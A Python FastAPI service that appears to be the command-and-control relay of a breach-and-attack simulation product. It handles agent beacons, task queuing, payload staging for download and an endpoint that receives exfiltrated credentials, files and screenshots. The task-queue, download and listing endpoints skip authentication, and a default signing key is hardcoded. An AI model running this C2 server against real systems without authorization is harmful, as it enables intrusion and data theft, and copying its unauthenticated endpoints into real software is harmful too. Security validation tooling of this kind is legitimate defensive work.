"""
HTTP C2 Relay Service.

This service receives REAL C2 (Command & Control) callbacks from OffenSight agents
during security validation exercises. It acts as the "server" side of C2 channels.

Key Responsibilities:
1. Accept beacon callbacks from agents
2. Stage payloads for download
3. Receive exfiltrated data
4. Log all activity for validation evidence
5. Report results back to Master Server (OffenSight) - NOT Command Center

Architecture Note:
- Command Center = Mirqab management portal (licenses, feeds, CVEs)
- Master Server = Customer's OffenSight instance (attack orchestration)
- Cloud Relay = This service (external attack infrastructure)

This is NOT a simulation - it handles real attack traffic in a controlled manner.
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import os
import secrets
import time
from datetime import datetime, timezone
from typing import Any
from uuid import uuid4

import httpx
import structlog
from fastapi import FastAPI, HTTPException, Request, Response, Header, BackgroundTasks
from fastapi.responses import PlainTextResponse, JSONResponse
from pydantic import BaseModel, Field

# Configure structured logging
structlog.configure(
    processors=[
        structlog.processors.TimeStamper(fmt="iso"),
        structlog.processors.JSONRenderer(),
    ]
)
log = structlog.get_logger()

# =============================================================================
# Configuration
# =============================================================================

ENVIRONMENT = os.getenv("ENVIRONMENT", "dev")
# Master Server URL - the customer's OffenSight instance (NOT Mirqab Command Center)
MASTER_SERVER_URL = os.getenv("MASTER_SERVER_URL", os.getenv("COMMAND_CENTER_URL", "http://localhost:8000"))
SIGNING_KEY = os.getenv("SIGNING_KEY", "dev-key-change-in-production")
GCS_BUCKET = os.getenv("GCS_BUCKET", "")

# C2 Protocol Settings
BEACON_JITTER_PERCENT = 20
DEFAULT_BEACON_INTERVAL = 60  # seconds
MAX_PAYLOAD_SIZE = 10 * 1024 * 1024  # 10MB

# =============================================================================
# Data Models
# =============================================================================


class BeaconRequest(BaseModel):
    """Beacon callback from an agent."""
    agent_id: str
    execution_id: str
    tenant_id: str
    timestamp: datetime
    hostname: str | None = None
    username: str | None = None
    os_info: str | None = None
    signature: str  # HMAC signature for authentication


class BeaconResponse(BaseModel):
    """Response to a beacon callback."""
    beacon_id: str
    sleep_interval: int
    jitter_percent: int
    tasks: list[dict] = []


class TaskResult(BaseModel):
    """Result of a task execution."""
    agent_id: str
    execution_id: str
    task_id: str
    status: str  # success, failed, timeout
    output: str | None = None
    error: str | None = None
    timestamp: datetime


class PayloadStageRequest(BaseModel):
    """Request to stage a payload for download."""
    execution_id: str
    tenant_id: str
    payload_name: str
    payload_data: str  # Base64 encoded
    ttl_seconds: int = 3600
    signature: str


class ExfilData(BaseModel):
    """Exfiltrated data from agent."""
    agent_id: str
    execution_id: str
    tenant_id: str
    data_type: str  # file, credential, screenshot, etc.
    data: str  # Base64 encoded
    filename: str | None = None
    signature: str


# =============================================================================
# Application
# =============================================================================

app = FastAPI(
    title="Mirqab HTTP C2 Relay",
    description="Receives real C2 callbacks from OffenSight agents",
    version="1.0.0",
)

# In-memory storage (use Redis in production)
_beacons: dict[str, dict] = {}  # agent_id -> beacon state
_staged_payloads: dict[str, dict] = {}  # payload_id -> payload data
_task_queue: dict[str, list] = {}  # agent_id -> tasks
_exfil_store: dict[str, list] = {}  # execution_id -> exfiltrated data


# =============================================================================
# Authentication
# =============================================================================


def verify_signature(data: dict, signature: str, exclude_fields: list[str] = None) -> bool:
    """Verify HMAC signature of request data."""
    if not SIGNING_KEY:
        return False

    exclude = exclude_fields or ["signature"]
    signing_data = {k: v for k, v in data.items() if k not in exclude}
    signing_string = json.dumps(signing_data, sort_keys=True, default=str)

    expected = hmac.new(
        SIGNING_KEY.encode(),
        signing_string.encode(),
        hashlib.sha256,
    ).hexdigest()

    return hmac.compare_digest(expected, signature)


def generate_signature(data: dict) -> str:
    """Generate HMAC signature for response data."""
    signing_string = json.dumps(data, sort_keys=True, default=str)
    return hmac.new(
        SIGNING_KEY.encode(),
        signing_string.encode(),
        hashlib.sha256,
    ).hexdigest()


# =============================================================================
# C2 Endpoints
# =============================================================================


@app.post("/beacon", response_model=BeaconResponse)
async def beacon_callback(
    request: BeaconRequest,
    background_tasks: BackgroundTasks,
    x_real_ip: str | None = Header(None),
):
    """
    Handle beacon callback from agent.

    This is the primary C2 channel - agents check in here periodically.
    """
    # Verify signature
    if not verify_signature(request.model_dump(), request.signature):
        log.warning(
            "beacon_auth_failed",
            agent_id=request.agent_id,
            source_ip=x_real_ip,
        )
        raise HTTPException(status_code=403, detail="Authentication failed")

    beacon_id = f"bcn_{uuid4().hex[:12]}"
    now = datetime.now(timezone.utc)

    # Log the beacon
    log.info(
        "beacon_received",
        beacon_id=beacon_id,
        agent_id=request.agent_id,
        execution_id=request.execution_id,
        tenant_id=request.tenant_id,
        hostname=request.hostname,
        source_ip=x_real_ip,
    )

    # Update beacon state
    _beacons[request.agent_id] = {
        "last_seen": now.isoformat(),
        "execution_id": request.execution_id,
        "tenant_id": request.tenant_id,
        "hostname": request.hostname,
        "username": request.username,
        "os_info": request.os_info,
        "beacon_count": _beacons.get(request.agent_id, {}).get("beacon_count", 0) + 1,
    }

    # Get pending tasks for this agent
    tasks = _task_queue.pop(request.agent_id, [])

    # Report to Command Center (async)
    background_tasks.add_task(
        report_beacon_to_master,
        beacon_id,
        request,
        x_real_ip,
    )

    return BeaconResponse(
        beacon_id=beacon_id,
        sleep_interval=DEFAULT_BEACON_INTERVAL,
        jitter_percent=BEACON_JITTER_PERCENT,
        tasks=tasks,
    )


@app.post("/task/result")
async def receive_task_result(
    result: TaskResult,
    background_tasks: BackgroundTasks,
):
    """Receive result of task execution from agent."""
    log.info(
        "task_result_received",
        agent_id=result.agent_id,
        task_id=result.task_id,
        status=result.status,
    )

    # Report to Command Center
    background_tasks.add_task(
        report_task_result_to_master,
        result,
    )

    return {"status": "received", "task_id": result.task_id}


@app.post("/stage")
async def stage_payload(request: PayloadStageRequest):
    """
    Stage a payload for agent download.

    Payloads are stored temporarily and can be retrieved by agents.
    """
    if not verify_signature(request.model_dump(), request.signature):
        raise HTTPException(status_code=403, detail="Authentication failed")

    payload_id = f"pld_{uuid4().hex[:12]}"

    # Decode and validate payload
    try:
        payload_bytes = base64.b64decode(request.payload_data)
        if len(payload_bytes) > MAX_PAYLOAD_SIZE:
            raise HTTPException(status_code=413, detail="Payload too large")
    except Exception as e:
        raise HTTPException(status_code=400, detail=f"Invalid payload data: {e}")

    # Store payload
    _staged_payloads[payload_id] = {
        "execution_id": request.execution_id,
        "tenant_id": request.tenant_id,
        "name": request.payload_name,
        "data": payload_bytes,
        "staged_at": datetime.now(timezone.utc).isoformat(),
        "expires_at": time.time() + request.ttl_seconds,
    }

    log.info(
        "payload_staged",
        payload_id=payload_id,
        execution_id=request.execution_id,
        name=request.payload_name,
        size=len(payload_bytes),
    )

    return {
        "payload_id": payload_id,
        "download_url": f"/download/{payload_id}",
        "expires_in": request.ttl_seconds,
    }


@app.get("/download/{payload_id}")
async def download_payload(payload_id: str, x_agent_id: str | None = Header(None)):
    """
    Download a staged payload.

    Agents retrieve payloads using the URL provided during staging.
    """
    payload = _staged_payloads.get(payload_id)

    if not payload:
        raise HTTPException(status_code=404, detail="Payload not found")

    if time.time() > payload["expires_at"]:
        del _staged_payloads[payload_id]
        raise HTTPException(status_code=410, detail="Payload expired")

    log.info(
        "payload_downloaded",
        payload_id=payload_id,
        agent_id=x_agent_id,
        execution_id=payload["execution_id"],
    )

    return Response(
        content=payload["data"],
        media_type="application/octet-stream",
        headers={"Content-Disposition": f'attachment; filename="{payload["name"]}"'},
    )


@app.post("/exfil")
async def receive_exfil(
    data: ExfilData,
    background_tasks: BackgroundTasks,
):
    """
    Receive exfiltrated data from agent.

    This endpoint collects data "exfiltrated" by agents during attack simulations.
    """
    if not verify_signature(data.model_dump(), data.signature):
        raise HTTPException(status_code=403, detail="Authentication failed")

    exfil_id = f"exf_{uuid4().hex[:12]}"

    # Decode data
    try:
        exfil_bytes = base64.b64decode(data.data)
    except Exception:
        raise HTTPException(status_code=400, detail="Invalid data encoding")

    # Store locally
    if data.execution_id not in _exfil_store:
        _exfil_store[data.execution_id] = []

    _exfil_store[data.execution_id].append({
        "exfil_id": exfil_id,
        "agent_id": data.agent_id,
        "data_type": data.data_type,
        "filename": data.filename,
        "size": len(exfil_bytes),
        "received_at": datetime.now(timezone.utc).isoformat(),
    })

    log.info(
        "exfil_received",
        exfil_id=exfil_id,
        agent_id=data.agent_id,
        execution_id=data.execution_id,
        data_type=data.data_type,
        size=len(exfil_bytes),
    )

    # Store to GCS if configured
    if GCS_BUCKET:
        background_tasks.add_task(
            store_exfil_to_gcs,
            exfil_id,
            data,
            exfil_bytes,
        )

    # Report to Command Center
    background_tasks.add_task(
        report_exfil_to_master,
        exfil_id,
        data,
        len(exfil_bytes),
    )

    return {"exfil_id": exfil_id, "received": True}


# =============================================================================
# Management Endpoints
# =============================================================================


@app.post("/task/queue")
async def queue_task(
    agent_id: str,
    task: dict,
    x_command_center_signature: str | None = Header(None),
):
    """
    Queue a task for an agent (called by Command Center).
    """
    if agent_id not in _task_queue:
        _task_queue[agent_id] = []

    task_id = f"tsk_{uuid4().hex[:12]}"
    task["task_id"] = task_id
    task["queued_at"] = datetime.now(timezone.utc).isoformat()

    _task_queue[agent_id].append(task)

    log.info(
        "task_queued",
        task_id=task_id,
        agent_id=agent_id,
        task_type=task.get("type"),
    )

    return {"task_id": task_id, "queued": True}


@app.get("/agents")
async def list_active_agents():
    """List all agents that have checked in."""
    return {
        "agents": [
            {
                "agent_id": agent_id,
                **state,
            }
            for agent_id, state in _beacons.items()
        ]
    }


@app.get("/execution/{execution_id}/exfil")
async def get_execution_exfil(execution_id: str):
    """Get all exfiltrated data for an execution."""
    return {
        "execution_id": execution_id,
        "exfil_data": _exfil_store.get(execution_id, []),
    }


@app.get("/health")
async def health_check():
    """Health check endpoint."""
    return {
        "status": "healthy",
        "environment": ENVIRONMENT,
        "active_agents": len(_beacons),
        "staged_payloads": len(_staged_payloads),
        "queued_tasks": sum(len(tasks) for tasks in _task_queue.values()),
    }


# =============================================================================
# Background Tasks
# =============================================================================


async def report_beacon_to_master(
    beacon_id: str,
    request: BeaconRequest,
    source_ip: str | None,
):
    """Report beacon callback to Command Center."""
    try:
        async with httpx.AsyncClient() as client:
            await client.post(
                f"{MASTER_SERVER_URL}/api/v1/telemetry/c2/beacon",
                json={
                    "beacon_id": beacon_id,
                    "agent_id": request.agent_id,
                    "execution_id": request.execution_id,
                    "tenant_id": request.tenant_id,
                    "source_ip": source_ip,
                    "timestamp": datetime.now(timezone.utc).isoformat(),
                },
                timeout=10.0,
            )
    except Exception as e:
        log.error("master_report_failed", error=str(e), beacon_id=beacon_id)


async def report_task_result_to_master(result: TaskResult):
    """Report task result to Command Center."""
    try:
        async with httpx.AsyncClient() as client:
            await client.post(
                f"{MASTER_SERVER_URL}/api/v1/telemetry/c2/task-result",
                json=result.model_dump(mode="json"),
                timeout=10.0,
            )
    except Exception as e:
        log.error("master_report_failed", error=str(e), task_id=result.task_id)


async def report_exfil_to_master(
    exfil_id: str,
    data: ExfilData,
    size: int,
):
    """Report exfiltration event to Command Center."""
    try:
        async with httpx.AsyncClient() as client:
            await client.post(
                f"{MASTER_SERVER_URL}/api/v1/telemetry/c2/exfil",
                json={
                    "exfil_id": exfil_id,
                    "agent_id": data.agent_id,
                    "execution_id": data.execution_id,
                    "tenant_id": data.tenant_id,
                    "data_type": data.data_type,
                    "filename": data.filename,
                    "size": size,
                    "timestamp": datetime.now(timezone.utc).isoformat(),
                },
                timeout=10.0,
            )
    except Exception as e:
        log.error("master_report_failed", error=str(e), exfil_id=exfil_id)


async def store_exfil_to_gcs(exfil_id: str, data: ExfilData, content: bytes):
    """Store exfiltrated data to Google Cloud Storage."""
    try:
        from google.cloud import storage

        client = storage.Client()
        bucket = client.bucket(GCS_BUCKET)

        blob_path = f"{data.tenant_id}/{data.execution_id}/{exfil_id}"
        if data.filename:
            blob_path += f"_{data.filename}"

        blob = bucket.blob(blob_path)
        blob.upload_from_string(content, content_type="application/octet-stream")

        log.info("exfil_stored_gcs", exfil_id=exfil_id, path=blob_path)
    except Exception as e:
        log.error("gcs_store_failed", error=str(e), exfil_id=exfil_id)


# =============================================================================
# Entry Point
# =============================================================================

if __name__ == "__main__":
    import uvicorn

    uvicorn.run(app, host="0.0.0.0", port=8080)
